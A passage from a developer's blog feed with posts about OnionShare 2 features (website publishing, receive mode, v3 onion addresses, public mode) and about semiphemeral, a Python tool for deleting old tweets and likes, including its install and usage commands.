&lt;p&gt;If you want to use OnionShare to publish a website that you intend to remain online for a long time, it’s important to remember that your computer itself is literally the web server. If you turn off your computer, or even just suspend your laptop, the website will go down. To prevent this, you’ll have to use a computer that’s always turned on for this. You’ll also probably want to go into settings and check “Use a persistent address” – this means that if you close OnionShare and re-open it again (for example, if you have to install updates on the computer and reboot it), the URL will stay the same the next time you start the server. If you don’t use a persistent address, every URL is temporary, and there’s no way to re-use an old URL.&lt;/p&gt;
&lt;p&gt;Another thing that’s new is that OnionShare will now show you exactly what web requests people are making to your website (you get to see this when sharing and receiving files too, not just for publishing websites). For example, here’s a website hosted by OnionShare getting scanned with the &lt;a href="https://cirt.net/nikto2"&gt;nikto&lt;/a&gt; web vulnerability scanner.&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-nikto.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;And finally, since we put in all of the work to make it so you can browse through directory listings when publishing a website, we also made it so you can similarly browse through folders that are being shared when just sharing files, so people can see exactly what files they’re about to download before downloading them.&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-share-directory-listing.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;And if you go into settings and uncheck “Stop sharing after files have been sent” (this is the setting that makes the server shutdown after the first person downloads the files you’re sharing), then people will also be able to download individual files that you’re sharing, instead of only having the option to download everything at once.&lt;/p&gt;
&lt;p&gt;I hope you enjoy the new OnionShare!&lt;/p&gt;
</content></entry><entry><title>With Semiphemeral you can delete your old Twitter likes, but it's noisy</title><link href="https://micahflee.com/2019/07/with-semiphemeral-you-can-delete-your-old-twitter-likes-but-its-noisy/" rel="alternate"></link><updated>2019-07-21T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:ef4585b5-85e9-346a-879c-554aad7c4f0e</id><content type="html">&lt;p&gt;I don't know if others use Twitter the same way that I do, but I tend to like things quite a bit more frequently than I tweet or retweet things. I'd imagine that if you analyzed my last 10 years of Twitter likes, you could learn much more about me than just by looking at my timeline. My likes probably reveal exactly which political, technical, and social arguments I followed, and which sides I took in all of them.&lt;/p&gt;
&lt;p&gt;I recently programmed a tool called &lt;a href="https://micahflee.com/2019/06/semiphemeral-automatically-delete-your-old-tweets-except-for-the-ones-you-want-to-keep/"&gt;semiphemeral&lt;/a&gt;  to automate deleting all of my old tweets (except for ones that I want to keep), and it also goes back and unlikes all of the tweets that I liked more than 60 days ago  -- or, so I initially thought. It soon became clear that semiphemeral only actually deleted the most recent 4,000 likes.&lt;/p&gt;
&lt;p&gt;I just released a new version that allows you to delete &lt;em&gt;all&lt;/em&gt; of your old likes, but unfortunately there are some... caveats. (You can install semiphemeral with &lt;code&gt;pip3 install semiphemeral&lt;/code&gt;, and if you already have it installed you can upgrade to the latest version with &lt;code&gt;pip3 install --upgrade semiphemeral&lt;/code&gt;.)&lt;/p&gt;
&lt;p&gt;Twitter works in mysterious ways. If you have a very long like history, the only way to delete your old ones is to first &lt;em&gt;relike&lt;/em&gt; those tweets (yes, the tweets that you already liked), and &lt;em&gt;then&lt;/em&gt; you can unlike them. This means that your friends (and strangers) will get notifications that you, for example,  liked a random tweet from 2014 but by the time they open Twitter the notification will be gone, and you won't be listed in their likes for that tweet. And on top of that, running this script may take &lt;em&gt;weeks&lt;/em&gt;. Twitter only allows you to like up to 1,000 tweets per day, so if you need to relike/unlike about 10,000 tweets (this is what I did), it will take about 10 days to run. I had maybe a dozen different people contact me wondering if my account was hacked.&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter-deleting-likes.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;But why?&lt;/p&gt;
&lt;p&gt;It turns out that the Twitter &lt;a href="https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/get-favorites-list.html"&gt;API call&lt;/a&gt; for getting a list of tweets that a user has liked, &lt;code&gt;GET favorites/list&lt;/code&gt; , doesn't work as you'd expect. It only returns the most recent 4,000 likes -- and even if you delete those and wait several days, it never returns any that are older than those. In fact, there doesn't seem to be any way at all to get the API to give you a complete list of IDs for old tweets that you liked.&lt;/p&gt;
&lt;p&gt;In order to get a list of all of your old likes (since the Twitter API won't give it to you), you must go to &lt;a href="https://twitter.com/settings/your_twitter_data"&gt;https://twitter.com/settings/your_twitter_data&lt;/a&gt; and download your Twitter data (note that this is different than your "Twitter archive", which doesn't include information about your likes). Twitter will email you a link to a zip file. When you unzip it there will be many files, including a file called &lt;code&gt;like.js&lt;/code&gt;. Run this command, with the path to your &lt;code&gt;like.js&lt;/code&gt;, for example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;semiphemeral unlike --filename ~/path/to/like.js
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Using the &lt;code&gt;like.js&lt;/code&gt; file from your Twitter data, this will first fetch all of the tweets that you liked, then it with relike and unlike each one of them. Each relike will trigger a notification, but at the end of the process your likes will have actually been deleted.&lt;/p&gt;
&lt;p&gt;Each time it hits the 1,000 likes/day rate limit, semiphemeral will pause for 24 hours before continuing (if the command crashes or you cancel in the middle for any reason, it's safe to run it again to continue where you left off). If possible, I recommend you run this in a &lt;code&gt;screen&lt;/code&gt; or &lt;code&gt;tmux&lt;/code&gt; session on a server somewhere so that it doesn't get interrupted when you suspend your laptop. And if you're running semiphemeral on a cron job, I recommend that you disable it first, and then start it up again when it's finished.&lt;/p&gt;
&lt;p&gt;New likes don't have this problem, so as long as you regularly run &lt;code&gt;semiphemeral delete&lt;/code&gt;, your new likes will automatically get deleted.&lt;/p&gt;
&lt;p&gt;You can find the source code and readme for semiphemeral on it's &lt;a href="https://github.com/micahflee/semiphemeral"&gt;github project page&lt;/a&gt;.&lt;/p&gt;
</content></entry><entry><title>Semiphemeral: Automatically delete your old tweets, except for the ones you want to keep</title><link href="https://micahflee.com/2019/06/semiphemeral-automatically-delete-your-old-tweets-except-for-the-ones-you-want-to-keep/" rel="alternate"></link><updated>2019-06-05T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:8cfe620d-bc5e-3e48-a55f-3b7e5cb59f9b</id><content type="html">&lt;p&gt;In the almost 10 years that I've been using Twitter, I tweeted about 13,700 times, retweeted about 9,000 tweets, and liked (or "favorited", as we called liking back in the day) about 14,000 tweets. I decided to delete most of them using a tool I just finished programming called &lt;a href="https://github.com/micahflee/semiphemeral"&gt;semiphemeral&lt;/a&gt;. Here is why, and how.&lt;/p&gt;
&lt;p&gt;A lot of my classic tweets were... let's just say not exactly the highest quality.&lt;/p&gt;
&lt;p&gt;&lt;img src="tweet-coffee-pants.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;But more than just low quality, I simply don't see many benefits to having a decade-long timeline that anyone who wishes to stalk me can easily access and use against me. For example, in response to me criticizing WikiLeaks, a troll searched my Twitter history for the word "jew", dug up this 2011 tweet about me attending a Jewish wedding, and tweeted it to me with some nonsense about my "tribe".&lt;/p&gt;
&lt;p&gt;&lt;img src="tweet-jewish-wedding.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;And finally, in addition to mediocre tweets and the potential for harassment, I'm sure I've had some bad takes over the years.&lt;/p&gt;
&lt;p&gt;I care deeply about privacy. My default search engine is DuckDuckGo. At the moment, I carry an Android phone that doesn't have any Google apps on it. I host my email &lt;a href="https://theintercept.com/2019/04/30/helm-email-server/"&gt;from my house&lt;/a&gt;. When I text with people on Signal I always set disappearing messages to one week, no matter the conversation. So... why should my social media posts be on the internet forever?&lt;/p&gt;
&lt;p&gt;There are plenty of apps that make your tweets "ephemeral", where you can tweet like normal but everything older than, say, a month gets automatically deleted. I also found plenty of simple scripts on GitHub that do this, for those who don't want to give a third party access to their Twitter account.&lt;/p&gt;
&lt;p&gt;I looked into a few options but realized none of them would work for me because I don't actually want to delete &lt;em&gt;all&lt;/em&gt; of my old tweets. Some of them I'm quite proud of. Like &lt;a href="https://theintercept.com/2014/10/28/smuggling-snowden-secrets/"&gt;that time&lt;/a&gt; I secretly &lt;a href="https://twitter.com/micahflee/status/296119710485979136"&gt;tweeted&lt;/a&gt; the PGP fingerprint for Laura Poitras, at the request of Edward Snowden in the early stages of his whisleblowing, so he could be more confident that his communications with her weren't getting man-in-the-middled.&lt;/p&gt;
&lt;p&gt;&lt;img src="tweet-fingerprint.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;I've also written several twitter threads that I like and don't want to delete, and that even get cited by others. I wrote a massive thread full of the &lt;a href="https://twitter.com/micahflee/status/963852295271104512"&gt;sick misogynist details&lt;/a&gt; from leaked internal WikiLeaks DMs; a short thread about the time police broke into Chelsea Manning's house &lt;a href="https://twitter.com/micahflee/status/1004006878446153728"&gt;with guns drawn&lt;/a&gt; for a "wellness check"; a thread detailing everything that is publicly known about &lt;a href="https://twitter.com/micahflee/status/1088511697550172160"&gt;supply chain attacks&lt;/a&gt;; a thread about a 2-year-long &lt;a href="https://twitter.com/micahflee/status/990265575711617030"&gt;honeypot laptop&lt;/a&gt; project I did to try to detect evil maid attacks; among many others. And there are other tweets I don't want to delete too -- I don't mean to brag but occasionally I say something incredibly clever. And there's the &lt;a href="https://twitter.com/micahflee/status/908390382882373632"&gt;tweet&lt;/a&gt; that cryptographically proves that the person who controls my Keybase account also controls my Twitter account.&lt;/p&gt;
&lt;p&gt;I realized that I didn't want ephemeral tweets, I wanted &lt;em&gt;semiphemeral&lt;/em&gt; tweets. I want to automatically delete my old tweets except for those that meet specific criteria: if a tweet has more than a specific thresholds of retweets or likes, keep it. Also keep any other tweets that are part of a thread that includes a tweet I'm preserving -- I don't want to only keep the first tweet that passes the tweet/like threshold but then delete all the replies, or otherwise lose context. And of course, I wanted a way to tag specific tweets for exclusion from deletion.&lt;/p&gt;
&lt;p&gt;So, I programmed semiphemeral to do just that. &lt;a href="https://github.com/micahflee/semiphemeral"&gt;The code&lt;/a&gt; is licensed under MIT and programmed in python. Everyone is welcome to use it, but you'll need some tech skills to do so. It's a command line tool, not a service. And to use it, you need to generate Twitter API credentials with your Twitter account (roughly following &lt;a href="https://python-twitter.readthedocs.io/en/latest/getting_started.html"&gt;these instructions&lt;/a&gt;) -- this means you'll be interfacing with the Twitter API directly, rather than giving some third party permission to access your Twitter account. It will work fine to run on your laptop, but if you want to make it automatically delete old tweets going forward, you'll probably want to schedule it to run on a daily cron job on a server somewhere.&lt;/p&gt;
&lt;p&gt;You can install it with pip:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pip3 install semiphemeral
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here's how to use it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ semiphemeral 
Usage: semiphemeral [OPTIONS] COMMAND [ARGS]...

  Automatically delete your old tweets, except for the ones you want to keep

Options:
  --help  Show this message and exit.

Commands:
  configure  Start the web server to configure semiphemeral
  delete     Delete tweets that aren't automatically or manually excluded
  fetch      Download all tweets
  stats      Show stats about tweets in the database
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you run &lt;code&gt;semiphemeral configure&lt;/code&gt;, a local web app starts (powered by &lt;a href="http://flask.pocoo.org/"&gt;flask&lt;/a&gt;) which you load in a web browser. From here you can configure semipheral with both your Twitter API credentials, as well as the settings you want to use -- how old tweets are when they should get automatically deleted, what the retweet and like thresholds should be, as well as when to automatically unretweet and unlike old tweets.&lt;/p&gt;
&lt;p&gt;Here's what the settings web page looks like:&lt;/p&gt;
&lt;p&gt;&lt;img src="semiphemeral-settings.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;This web app also has an interface that lets you view all tweets that are staged for deletion a page at a time, filter the text of the tweets for words and phrases to quickly find specific ones, and manually exclude any tweets you choose from deletion.&lt;/p&gt;
&lt;p&gt;After configuring your API creds, you must download your entire timeline from Twitter by running &lt;code&gt;semiphemeral fetch&lt;/code&gt;. This may take a very long time the first time if you have a lot of tweets. Semiphemeral will automatically pause, sometimes for up to 15 minutes at a time, when it hits the Twitter API's rate limit. (All the Twitter API code is powered by &lt;a href="https://tweepy.readthedocs.io/en/latest/"&gt;tweepy&lt;/a&gt;), and it saves your entire history of tweets, as well as all the tweets from threads you've interacted with, in a sqlite database. The database code is powered by &lt;a href="https://www.sqlalchemy.org/"&gt;SQLAlchemy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(Side note: Did you know that Twitter "threads" are actually trees, from a data structure perspective? If a tweet is not replying to any other tweet, it's the root of the tree. It can have an arbitrary number of replies, and each of those replies can have an arbitrary number of replies of their own, which are the branches. If I replied to someone but their account has since been suspended or they deleted the tweet I replied to, my tweet is an orphan, and there's no easy way to determine what the root of its thread actually was.)&lt;/p&gt;
&lt;p&gt;And finally, after you're sure you've configured the settings you want and have sifted through all your old tweets and manually excluded any specific tweets from deletion, you may want to &lt;a href="https://help.twitter.com/en/managing-your-account/how-to-download-your-twitter-archive"&gt;download your Twitter archive&lt;/a&gt; for safe keeping. Then, run &lt;code&gt;semiphemeral delete&lt;/code&gt; to delete all of your old tweets, except for the ones you want to keep. This, too, might take a long time the first run. I've designed it to put &lt;code&gt;semiphemeral delete&lt;/code&gt; in a daily cron job, to continue to delete old tweets going forward.&lt;/p&gt;
&lt;p&gt;At the moment tweepy has &lt;a href="https://github.com/tweepy/tweepy/issues/1081"&gt;a bug&lt;/a&gt; that prevents the direct message API from working. But once that's fixed (or maybe before, if I have time and am feeling adventurous) I plan on adding a feature to also automatically delete all old direct messages.&lt;/p&gt;
&lt;p&gt;Settings are stored in &lt;code&gt;~/.semiphemeral/settings.json&lt;/code&gt;. All tweets (including exceptions, and deleted tweets) are stored in a sqlite database &lt;code&gt;~/.semiphemeral/tweets.db&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that I've deleted about 90% of my tweets, and all retweets that are newer than the past month, I feel like my Twitter account is in a much cleaner state than it was before, and there's so much less historical information about my daily likes and politics available to anyone who chooses to look than there used to be. I think I'm going to enjoy semiphemeral tweeting.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ semiphemeral stats
semiphemeral 0.1
Statistics
{
  "is_configured": true,
  "last_fetch": "2019-06-05 07:39AM",
  "my_tweets": 1353,
  "my_retweets": 127,
  "my_likes": 3987,
  "deleted_tweets": 12005,
  "deleted_retweets": 8917,
  "unliked_tweets": 2365,
  "excluded_tweets": 192,
  "other_tweets": 9537,
  "threads": 3949
}
&lt;/code&gt;&lt;/pre&gt;
</content></entry><entry><title>OnionShare 2 adds anonymous dropboxes, supports new Tor addresses, and is translated into a dozen new languages</title><link href="https://micahflee.com/2019/02/onionshare-2/" rel="alternate"></link><updated>2019-02-18T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:a5cf4e0d-ffcd-3100-ba68-80304318e572</id><content type="html">&lt;p&gt;After nearly a year of work from a &lt;a href="https://github.com/micahflee/onionshare/wiki/Developing-OnionShare"&gt;growing community&lt;/a&gt; of developers, designers, and translators, I'm excited that OnionShare 2 is finally ready. You can download it from &lt;a href="https://onionshare.org/"&gt;onionshare.org&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;OnionShare is an open source tool for securely and anonymously sending and receiving files using Tor onion services. It works by starting a web server directly on your computer and making it accessible as an unguessable Tor web address that others can load in &lt;a href="https://www.torproject.org/"&gt;Tor Browser&lt;/a&gt; to download files from you, or upload files to you. It doesn't require setting up a separate server, using a third party file-sharing service, or even logging into an account.&lt;/p&gt;
&lt;p&gt;Unlike services like email, Google Drive, DropBox, WeTransfer, or nearly any other way people typically send files to each other, when you use OnionShare you don't give any companies access to the files that you're sharing. So long as you share the unguessable web address in a secure way (like pasting it in an encrypted messaging app), &lt;em&gt;no one&lt;/em&gt; but you and the person you're sharing with can access your files.&lt;/p&gt;
&lt;p&gt;Here's a tour of some of the new parts of OnionShare 2.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#sharing-files-with-onionshare"&gt;Sharing files with OnionShare&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-macos-sandbox"&gt;The macOS sandbox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#next-generation-onion-services"&gt;Next generation onion services&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#onionshare-doesn-t-zip-if-you-share-just-one-file"&gt;OnionShare doesn't zip if you share just one file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#onionshare-addresses-are-ephemeral-by-default"&gt;OnionShare addresses are ephemeral by default&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#receiving-files-with-onionshare"&gt;Receiving files with OnionShare&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#only-open-things-from-people-you-trust-or-if-you-know-what-you-are-doing"&gt;Only open things from people you trust, or if you know what you are doing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#public-onionshare-addresses"&gt;Public OnionShare addresses&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#running-an-anonymous-dropbox"&gt;Running an anonymous dropbox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#onionshare-in-your-language"&gt;OnionShare in your language&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="sharing-files-with-onionshare"&gt;Sharing files with OnionShare&lt;/h3&gt;&lt;p&gt;Here's what OnionShare 2 looks like. When you first open it, it connects to the Tor network.&lt;/p&gt;
&lt;p&gt;&lt;img src="connecting-to-tor.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Once you're connected, you're in the "Share Files" tab (I'll talk more about the new "Receive Files" tab below).&lt;/p&gt;
&lt;p&gt;&lt;img src="share-mode1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;To securely and anonymously share files with someone, just drag and drop the files into the OnionShare window. Alternatively, you can click the "Add Files" and "Add Folder" buttons to browse your filesystem.&lt;/p&gt;
&lt;h3 id="the-macos-sandbox"&gt;The macOS sandbox&lt;/h3&gt;&lt;p&gt;In Windows and Linux there's just a single "Add" button that lets you select both files and folders. The reason for two separate buttons in the macOS version is a bit complicated, but boils down to a cool new security feature: The macOS sandbox is turned on in OnionShare 2, which means that even if someone manages to exploit a vulnerability in OnionShare to try to hack your computer, they still won't be able to access your data or run programs on your computer without first escaping the sandbox.&lt;/p&gt;
&lt;p&gt;&lt;img src="share-mode2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;I've dragged all of the files that make up the OnionShare source code into the window. Now, to make them accessible to someone else, I just click "Start sharing".&lt;/p&gt;
&lt;h3 id="next-generation-onion-services"&gt;Next generation onion services&lt;/h3&gt;&lt;p&gt;&lt;img src="share-mode3.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;After clicking the button, I wait a few seconds, and then OnionShare gives me an unguessable Tor address to share. This is also new in OnionShare 2: By default, it uses &lt;a href="https://blog.torproject.org/tors-fall-harvest-next-generation-onion-services"&gt;next generation Tor onion services&lt;/a&gt;, also known as &lt;code&gt;v3&lt;/code&gt; onion addresses. These are onion addresses that look like &lt;code&gt;lldan5gahapx5k7iafb3s4ikijc4ni7gx5iywdflkba5y2ezyg6sjgyd.onion&lt;/code&gt;, as opposed to the old &lt;code&gt;v2&lt;/code&gt; kind, that look like &lt;code&gt;elx57ue5uyfplgva.onion&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v3&lt;/code&gt; onions are much more secure than &lt;code&gt;v2&lt;/code&gt; onions for a variety of reasons, but they can be a bit unwieldy and hard to type (for example, if you're using OnionShare to move files between two computers that are both in front of you). You can still use &lt;code&gt;v2&lt;/code&gt; onion addresses if you want by going into Settings and choosing "Use legacy addresses".&lt;/p&gt;
&lt;p&gt;Also, you might notice that the OnionShare address is using HTTP and not HTTPS, but this is actually perfectly fine. HTTPS adds a layer of encryption between a web browser and a web server, but Tor onion services are already end-to-end encrypted, so HTTPS is not necessary (it's also not feasible without browser warnings: Let's Encrypt doesn't sign HTTPS certificates for &lt;code&gt;.onion&lt;/code&gt; sites). Unlike loading normal websites in Tor Browser, when you load onion websites, there is no Tor exit node that could spy on the traffic -- all of the traffic stays within the Tor network.&lt;/p&gt;
&lt;p&gt;Now, I need to send this web address to my friend who I'm sharing files with. The easiest way to do this securely is to use an encrypted messaging app like Signal Desktop, Wire, Keybase, or iMessage -- or, if you're oldschool, Jabber/OTR. If the files you're sharing aren't especially sensitive, you can also share this web address in a way that is easily spied on but might be more convenient, like in a Facebook, Twitter, Google Hangouts, Slack, or Discord message, or in an email.&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-share1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;My friend then opens Tor Browser and loads the OnionShare address I sent her. She sees a website with a list of the files I'm sharing, and a "Download Files" button.&lt;/p&gt;
&lt;p&gt;The key thing to understand about how OnionShare works is that this website is hosted &lt;em&gt;directly on my laptop&lt;/em&gt;, not on a server in a data center somewhere. If I suspend my laptop, that link won't work anymore. If I close OnionShare before the files have been downloaded, then that Tor web address simply disappears from the internet. Because of this, OnionShare always takes place in real-time -- you and the person you're sharing files with need to both be online &lt;em&gt;at the same time&lt;/em&gt;.&lt;/p&gt;
&lt;h3 id="onionshare-doesn-t-zip-if-you-share-just-one-file"&gt;OnionShare doesn't zip if you share just one file&lt;/h3&gt;&lt;p&gt;My friend then downloads the files, which are automatically zipped up. In this case, the zip file is called &lt;code&gt;onionshare_snwga4.zip&lt;/code&gt; (the last part of the filename is random), and when she unzips it, she can see a copy of the OnionShare source code I sent. A new feature in OnionShare 2 is that if you share just a single file, it no longer zips it up (but still compresses it with gzip, built into the HTTP protocol).&lt;/p&gt;
&lt;p&gt;&lt;img src="share-mode4.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Back on my computer, OnionShare automatically stopped sharing the moment the files finished sending -- and when this happened, the OnionShare address completely disappeared from the internet, never to exist again.&lt;/p&gt;
&lt;h3 id="onionshare-addresses-are-ephemeral-by-default"&gt;OnionShare addresses are ephemeral by default&lt;/h3&gt;&lt;p&gt;OnionShare addresses are &lt;em&gt;ephemeral&lt;/em&gt;, and intended for one-time use. (For example, if someone sends you an OnionShare address in a Twitter DM, and a few minutes later you load it and download the files, that address won't exist anymore in the future. If anyone ever gains access to your Twitter DM history, that OnionShare address will no longer work.)&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-share2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;As you can see, after my friend finished downloading the files I sent her, that OnionShare address ceased to exist.&lt;/p&gt;
&lt;p&gt;This is the default behavior of OnionShare, but you might want to use OnionShare to send files to a group of people, not just one person, in which case you don't want it to be ephemeral. In this case, you can uncheck "Stop sharing after files have been sent" in the Settings, and then multiple people can download your files, and you'll continue sharing until you manually click "Stop sharing" or close OnionShare.&lt;/p&gt;
&lt;h3 id="receiving-files-with-onionshare"&gt;Receiving files with OnionShare&lt;/h3&gt;&lt;p&gt;&lt;img src="receive-mode1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;All of this is, more or less, how OnionShare has always worked. But the "Receive Files" tab is brand new to OnionShare 2. And it's still just the beginning -- we have plans for adding more tabs to OnionShare in the future, such as a &lt;a href="https://github.com/micahflee/onionshare/issues/791"&gt;static website sharing&lt;/a&gt; tab.&lt;/p&gt;
&lt;p&gt;When you use OnionShare to receive files, you turn your computer into an anonymous dropbox -- I like to think of it is a super lightweight version of &lt;a href="https://securedrop.org/"&gt;SecureDrop&lt;/a&gt; that anyone can run on their own laptop, for free, without needing to set up any infrastructure or do any systems administration. (However, it's not as robust, or secure, as SecureDrop, which enforces isolated environments in a way that OnionShare can't.)&lt;/p&gt;
&lt;p&gt;&lt;img src="receive-mode2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;A few seconds after I clicked "Start Receive Mode", OnionShare gave me an unguessable Tor address, which I share with my friend the same way I did with the share mode address. But this time, instead of me sending files to her, &lt;em&gt;she can send files to me&lt;/em&gt;, and all she needs is Tor Browser -- she doesn't need OnionShare herself.&lt;/p&gt;
&lt;p&gt;If I publish this OnionShare address, &lt;em&gt;anyone can send files to me&lt;/em&gt;, without me having any way to know who they are (because they'll be using Tor), and in a way that is end-to-end encrypted, so eavesdroppers spying on either of our networks can't access the files, or even realize that we're using OnionShare. To network eavesdroppers, all they'll be able to tell is that we're both using Tor.&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-receive1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;My friend simply clicks Browse, finds the files she wants to send, and clicks "Send Files".&lt;/p&gt;
&lt;p&gt;&lt;img src="receive-mode3.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Over in OnionShare on my computer, I can see the status of all of the files that I'm receiving. Because OnionShare uses Tor onion services, I don't actually have any way of knowing &lt;em&gt;who&lt;/em&gt; is sending files to me -- if I want to make it so only very specific people can send me files, I need to securely share the OnionShare address to only those people. My computer will continue to act as an anonymous dropbox until I click "Stop Receive Mode", or close OnionShare. And, just like with share mode, if I suspend my laptop, the OnionShare address stops working.&lt;/p&gt;
&lt;p&gt;&lt;img src="receive-mode-finder.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;The files that I receive get saved to &lt;code&gt;~/OnionShare&lt;/code&gt;, and they're automatically organized by date and time.&lt;/p&gt;
&lt;h3 id="only-open-things-from-people-you-trust-or-if-you-know-what-you-are-doing"&gt;Only open things from people you trust, or if you know what you are doing&lt;/h3&gt;&lt;p&gt;Now that you know how the "Receive Files" tab works, &lt;em&gt;be very careful with it&lt;/em&gt;, and make sure to take the prominent warning to heart:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;Some files can potentially take control of your computer if you open them. Only open things from people you trust, or if you know what you are doing.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;All of the warnings about not opening email attachments apply just as much here. In this example, I received &lt;code&gt;gimp-2.10.8-x86_64-2.dmg&lt;/code&gt;, which is an installer for the open source image editing software GIMP. But, it could easily be a modified version of that installer that has malware hidden inside. And if someone sends you &lt;code&gt;.docx&lt;/code&gt; or &lt;code&gt;.pdf&lt;/code&gt; files, they could contain malware that could try to hack you through a vulnerability in Microsoft Word or Adobe Reader. How to safely open files you receive is &lt;em&gt;outside of the scope of OnionShare&lt;/em&gt;. Use this feature with caution.&lt;/p&gt;
&lt;h3 id="public-onionshare-addresses"&gt;Public OnionShare addresses&lt;/h3&gt;&lt;p&gt;OnionShare 2 has a new feature: Public mode. But before explaining what it does, first I'll explain how OnionShare addresses work without it.&lt;/p&gt;
&lt;p&gt;By default, OnionShare addresses look &lt;code&gt;http://[tor-address].onion/[slug]&lt;/code&gt;, where the slug is two random words out of a list of words 7,776 words (technically, this is a 2-word &lt;a href="https://theintercept.com/2015/03/26/passphrases-can-memorize-attackers-cant-guess/"&gt;diceware passphrase&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;The idea is that if an attacker could figure out the &lt;code&gt;tor-address&lt;/code&gt; part of the address, they still can't download the files you're sharing, or upload files to your computer, without first knowing the slug. The slug is, essentially, a password. (This is less important when using &lt;code&gt;v3&lt;/code&gt; onion services. The old &lt;code&gt;v2&lt;/code&gt; onion services have a known issue where, if the onion connection happens to get facilitated by a malicious Tor node, that node could learn the &lt;code&gt;tor-address&lt;/code&gt; part. This is one of the reasons that &lt;code&gt;v3&lt;/code&gt; onions are more secure.)&lt;/p&gt;
&lt;p&gt;But the slug is only two words, so what stops the attacker from guessing it, by guessing every possible 2-word slug? The wordlist that OnionShare uses is public, after all.&lt;/p&gt;
&lt;p&gt;&lt;img src="slug-guess.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;OnionShare counts how many 404 errors (file not found web requests), and on the 20th 404 error, it assumes that someone it trying to guess the slug and automatically stops the server.&lt;/p&gt;
&lt;p&gt;This gives the attacker 20 chances to guess the two words correctly. Because the words are chosen from a list of 7,776 words, that means there are 7,776^2, or over 60 million, possible slugs. Which basically means that if an attacker tries to guess the slug, they have a 0.00003% chance of getting it right within their only 20 chances, and a 99.99996% chance of failing, and forcing OnionShare to stop sharing.&lt;/p&gt;
&lt;p&gt;This works great, but what if you &lt;em&gt;want&lt;/em&gt; anyone to be able to load your OnionShare address?&lt;/p&gt;
&lt;p&gt;For example, let's say you want to anonymously publish some files. You disable the "Stop sharing after files have been sent" setting, drag the files into OnionShare, start sharing, and tweet the OnionShare address. It turns out that anyone on the internet that sees the tweet can force your server to stop just by making 20 404 errors. (This situation actually happened, by the way, and their server kept shutting down because people kept making 404 errors.)&lt;/p&gt;
&lt;p&gt;This is the use case that public mode was built for. If you want to publicly share an OnionShare address, just go to Settings and check the box next to "Public mode". When you start sharing, the OnionShare address will look like &lt;code&gt;http://[tor-address].onion/&lt;/code&gt;, without the slug, and the server will remain up no matter how many 404 errors it gets.&lt;/p&gt;
&lt;h3 id="running-an-anonymous-dropbox"&gt;Running an anonymous dropbox&lt;/h3&gt;&lt;p&gt;You've seen receive mode, which is great for allowing people to privately send you files. But if you want to allow &lt;em&gt;anyone&lt;/em&gt; to privately send you files, there are a few settings you'll want to consider using.&lt;/p&gt;
&lt;p&gt;First, you'll definitely want to enable public mode.&lt;/p&gt;
&lt;p&gt;Second, you'll also want to go into Settings and enable "Use a persistent address". With this setting, when you stop an OnionShare server and then start it again, you'll get this exact same onion address as you had last time. This gives you the flexibility to, for example, reboot your computer and start OnionShare again, without having to switch OnionShare addresses.&lt;/p&gt;
